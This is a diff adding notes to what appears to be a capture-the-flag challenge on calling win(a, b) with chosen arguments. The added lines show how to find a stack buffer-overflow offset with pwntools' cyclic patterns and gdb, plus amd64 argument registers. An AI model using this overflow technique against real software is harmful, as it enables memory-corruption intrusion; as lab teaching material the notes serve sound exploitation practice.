@@ -1,4 +1,21 @@
 You must call win(a, b) with specific arguments
+
+Payload explanation:
+```python
+ payload = b"A" * cyclic_find(0x6161616c6161616b)
+```
+So to get this crashing address, you need to run the program in debug mode,
+send input until it crashes, there will be this output:
+```shell
+ ► 0x401aa7 <main+120>    ret                                <0x6161616161616161>
+```
+
+or
+```shell
+gdb ./main
+run <<< $(python3 -c "from pwn import*; print(cyclic(200,n=8).decode())")
+```
+
 On amd64 (Linux):
 - 1st argument → rdi
 - 2nd argument → rsi
